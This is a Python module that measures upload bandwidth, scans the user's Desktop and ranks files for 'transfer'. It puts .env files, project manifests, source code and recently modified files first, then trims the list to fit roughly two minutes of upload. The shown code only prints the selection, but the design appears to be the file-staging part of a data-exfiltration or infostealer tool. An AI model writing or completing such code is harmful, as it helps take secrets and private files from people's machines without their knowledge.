# file: server/file_priority.py

from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import speedtest
import heapq
import time
import os

# =========================================================
# CONFIG
# =========================================================

HOME = Path.home()
CURRENT = Path.cwd()

DESKTOP = HOME / "Desktop"

IMPORTANT_NAMES = {
    "pyproject.toml",
    "package.json",
    ".env",
    "requirements.txt",
    "docker-compose.yml",
    "Cargo.toml",
}

IMPORTANT_EXTENSIONS = {
    ".py",
    ".rs",
    ".js",
    ".ts",
    ".json",
    ".toml",
    ".yaml",
    ".yml",
}

MAX_SECONDS = 120
MIN_SPEED_MBIT = 5

MAX_WORKERS = min(32, (os.cpu_count() or 4) * 4)

# =========================================================
# SPEED
# =========================================================

def measure_upload_mbit() -> float:

    s = speedtest.Speedtest()

    s.get_best_server()

    upload_bps = s.upload()

    return upload_bps / 1_000_000


def get_transfer_amount(upload_speed_mbit: float) -> int:

    if upload_speed_mbit < MIN_SPEED_MBIT:
        return 100 * 1024 * 1024

    bytes_per_second = (
        upload_speed_mbit * 1_000_000
    ) / 8

    return int(bytes_per_second * MAX_SECONDS)


def measure_upload_limit() -> int:

    try:

        print("[*] Measuring upload speed...")

        speed = measure_upload_mbit()

        print(f"[+] Upload speed: {speed:.2f} Mbit/s")

        return get_transfer_amount(speed)

    except Exception:

        print("[!] Speedtest failed")

        return 100 * 1024 * 1024


# =========================================================
# FILE SIZE
# =========================================================

def make_file_size_beauty(size: int) -> str:

    if size < 1024:
        return f"{size} B"

    elif size < 1024 ** 2:
        return f"{size / 1024:.2f} KB"

    elif size < 1024 ** 3:
        return f"{size / (1024 ** 2):.2f} MB"

    else:
        return f"{size / (1024 ** 3):.2f} GB"


# =========================================================
# FAST SCAN
# =========================================================

def scan_file(file: Path):

    try:

        stat_data = file.stat()

        return {
            "path": file,
            "name": file.name,
            "suffix": file.suffix,
            "size": stat_data.st_size,
            "mtime": stat_data.st_mtime,
            "parent": file.parent,
        }

    except Exception:
        return None


def fast_scan():

    print("[*] Scanning files...")

    start = time.perf_counter()

    raw_files = []

    count = 0

    for file in DESKTOP.rglob("*"):

        if file.is_file():
            raw_files.append(file)

            count += 1

            if count % 1000 == 0:
                print(f"[*] Found {count} files", end="\r")

    print()
    print(f"[*] Processing {len(raw_files)} files with threads...")

    results = []

    with ThreadPoolExecutor(
        max_workers=MAX_WORKERS
    ) as executor:

        for result in executor.map(
            scan_file,
            raw_files,
            chunksize=128
        ):

            if result:
                results.append(result)

    print(
        f"[+] Scan done in "
        f"{time.perf_counter() - start:.2f}s"
    )

    return results


# =========================================================
# PRIORITY
# =========================================================

def calculate_priority(file_data: dict) -> int:

    score = 0

    name = file_data["name"]
    suffix = file_data["suffix"]
    size = file_data["size"]
    modified = file_data["mtime"]

    if name in IMPORTANT_NAMES:
        score += 1000

    if suffix in IMPORTANT_EXTENSIONS:
        score += 200

    # smaller files first
    if size < 50_000:
        score += 100

    elif size < 500_000:
        score += 50

    age_hours = (
        time.time() - modified
    ) / 3600

    if age_hours < 24:
        score += 300

    elif age_hours < 72:
        score += 150

    elif age_hours < 168:
        score += 50

    return score


# =========================================================
# ANALYSIS
# =========================================================

def get_biggest(files, limit=20):

    return heapq.nlargest(
        limit,
        files,
        key=lambda x: x["size"]
    )


def get_last_changed(files, limit=20):

    return heapq.nlargest(
        limit,
        files,
        key=lambda x: x["mtime"]
    )


def get_biggest_folders(files, limit=20):

    folder_sizes = {}

    for file in files:

        parent = file["parent"]

        folder_sizes[parent] = (
            folder_sizes.get(parent, 0)
            + file["size"]
        )

    return heapq.nlargest(
        limit,
        folder_sizes.items(),
        key=lambda x: x[1]
    )


# =========================================================
# BUILD PRIORITY LIST
# =========================================================

def build_priority_file_list(files):

    print("[*] Calculating priorities...")

    scored_files = []

    for index, file_data in enumerate(files):

        score = calculate_priority(file_data)

        file_data["score"] = score

        scored_files.append(file_data)

        if index % 5000 == 0 and index != 0:
            print(
                f"[*] Processed {index} files",
                end="\r"
            )

    print()

    scored_files.sort(
        key=lambda x: x["score"],
        reverse=True
    )

    return scored_files


# =========================================================
# SELECT FILES
# =========================================================
#LIST wihout max upload bytes
# def select_files_for_transfer(
#     scored_files,
#     max_bytes
# ):

#     print("[*] Selecting files...")

#     selected = []

#     current_size = 0

#     for file_data in scored_files:

#         size = file_data["size"]

#         if current_size + size > max_bytes:
#             continue

#         selected.append(file_data)

#         current_size += size

#     return selected


def select_files_for_transfer(
    scored_files,
    max_bytes
):

    print("[*] Selecting files...")

    selected = []

    current_size = 0

    used_paths = set()

    # höchste priorität zuerst
    scored_files.sort(
        key=lambda x: (
            x["score"],
            -x["size"]  # kleinere zuerst
        ),
        reverse=True
    )

    for file_data in scored_files:

        path = str(file_data["path"])

        if path in used_paths:
            continue

        size = file_data["size"]

        # limit erreicht
        if current_size + size > max_bytes:
            continue

        selected.append(file_data)

        used_paths.add(path)

        current_size += size

        # exakt stoppen
        if current_size >= max_bytes:
            break

    print(
        f"[+] Final transfer size: "
        f"{make_file_size_beauty(current_size)}"
    )

    return selected


def get_selected_files():
    limit = measure_upload_limit()
    files = fast_scan()
    scored = build_priority_file_list(files)
    return select_files_for_transfer(scored, limit)


# =========================================================
# MAIN
# =========================================================

def main():

    total_start = time.perf_counter()

    # ---------------------------------------------

    limit = measure_upload_limit()

    print(
        f"[+] Transfer limit: "
        f"{make_file_size_beauty(limit)}"
    )

    print()

    # ---------------------------------------------

    files = fast_scan()

    print(
        f"[+] Total scanned files: "
        f"{len(files)}"
    )

    print()

    # ---------------------------------------------

    biggest = get_biggest(files)

    print("[+] Biggest files:")

    for file in biggest[:5]:

        print(
            f"{make_file_size_beauty(file['size'])} "
            f"-> {file['path']}"
        )

    print()

    # ---------------------------------------------

    latest = get_last_changed(files)

    print("[+] Last changed:")

    for file in latest[:5]:

        print(
            f"{file['path']}"
        )

    print()

    # ---------------------------------------------

    folders = get_biggest_folders(files)

    print("[+] Biggest folders:")

    for folder, size in folders[:5]:

        print(
            f"{make_file_size_beauty(size)} "
            f"-> {folder}"
        )

    print()

    # ---------------------------------------------

    scored_files = build_priority_file_list(files)

    selected_files = select_files_for_transfer(
        scored_files,
        limit
    )

    # ---------------------------------------------

    print()

    print(
        f"[+] Selected files: "
        f"{len(selected_files)}"
    )

    print()

    for file in selected_files[:50]:

        print(
            f"[{file['score']}] "
            f"{make_file_size_beauty(file['size'])} "
            f"-> {file['path']}"
        )

    # ---------------------------------------------

    print()

    print(
        f"[+] Total runtime: "
        f"{time.perf_counter() - total_start:.2f}s"
    )


if __name__ == "__main__":
    main()